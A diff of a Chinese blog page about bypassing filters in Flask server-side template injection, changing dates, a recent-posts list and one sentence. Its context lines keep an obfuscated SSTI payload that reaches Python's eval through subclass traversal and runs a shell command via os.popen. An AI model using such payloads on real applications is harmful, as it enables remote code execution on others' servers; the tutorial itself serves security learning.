@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/7.jpg">
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/8.jpg">
 <meta property="article:published_time" content="2024-12-26T07:48:06.000Z">
-<meta property="article:modified_time" content="2024-12-31T05:08:32.710Z">
+<meta property="article:modified_time" content="2025-01-01T09:26:24.406Z">
 <meta property="article:author" content="AAAAl">
 <meta property="article:tag" content="绕过">
 <meta name="twitter:card" content="summary_large_image">
@@ -79,7 +79,7 @@
 <div class="widgets">
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/12/30/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E6%97%A0%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-无回显</span></a><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/"><span class="title">flask中的ssti注入-绕过</span></a><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/01/08/linus%E4%B8%AD%E7%9A%84%E6%8F%90%E6%9D%83-suid%E6%8F%90%E5%8F%96/"><span class="title">linus中的提权-suid提权</span></a><a class="item title" href="/2025/01/08/linus%E4%B8%AD%E7%9A%84%E6%8F%90%E6%9D%83-suid%E6%8F%90%E6%9D%83/"><span class="title">linus中的提权-suid提权</span></a><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/"><span class="title">flask中的ssti注入-绕过</span></a><a class="item title" href="/2024/12/30/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E6%97%A0%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-无回显</span></a><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a></div></widget>
 </div>
 <footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/AAAA-l" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"></a></div></footer>
 </div></aside><div class="l_main" id="main">
@@ -92,7 +92,7 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/python/">python</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/python/ssti/">ssti</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-26T07:48:06.000Z">2024-12-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-31T05:08:32.710Z">2024-12-31</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-26T07:48:06.000Z">2024-12-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-01-01T09:26:24.406Z">2025-01-01</time></span></div></div></div>
     
   </div>
   </div><article class="md-text content"><p>[TOC]</p>
@@ -221,7 +221,7 @@
 <p>这样写的话，整个payload就过于复杂，容易出现错误，而且[]被过滤了的话，上面就无法绕过了。我们这里可以使用<code>__getitem__</code>魔术方法，我们在<strong>使用[]来访问字典或者列表中的元素时就是在隐式地调这个方法</strong>。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#123;()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(412)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;eval&#x27;)(&quot;__\u0069\u006d\u0070\u006f\u0072\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p>我们这里还可以使用<strong>pop方法</strong>来访问代码<code>__getitem__</code>，这个方法返回对应的元素时也会将元素从列表或者字典中删除，所以一般不推荐使用。</p>
+<p>我们这里还可以使用<strong>pop方法</strong>来代替<code>__getitem__</code>，这个方法返回对应的元素时也会将元素从列表或者字典中删除，所以一般不推荐使用。</p>
 <p>其中针对字典对象，我们还可以使用<strong>get方法和setdefault方法</strong>来获取字典中的元素。</p>
 <p>还有使用<code>__dict__</code>魔术属性，这个属性储存的是对象中的所有属性，以字典的形式，也就是我们使用他来访问属性还得使用<code>[]</code>，再加上他本身也带有<strong>下划线</strong>，所以这个方法比较<strong>鸡肋</strong>。</p>
 <p><strong>vars函数</strong>，也可以使用来访问对象的属性，但是使用起来比较麻烦，这里权当记录一下。</p>
